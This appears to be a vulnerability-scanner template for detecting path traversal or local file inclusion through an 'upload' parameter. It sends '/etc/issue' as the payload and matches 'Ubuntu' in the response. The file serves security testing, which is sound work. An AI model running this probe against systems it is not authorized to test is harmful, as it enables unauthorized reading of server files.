id: lfi6-1045
name: 'Traversal in upload'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via upload'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      upload:
        - '/etc/issue'
    matchers:
      - type: word
        part: body
        words:
          - 'Ubuntu'
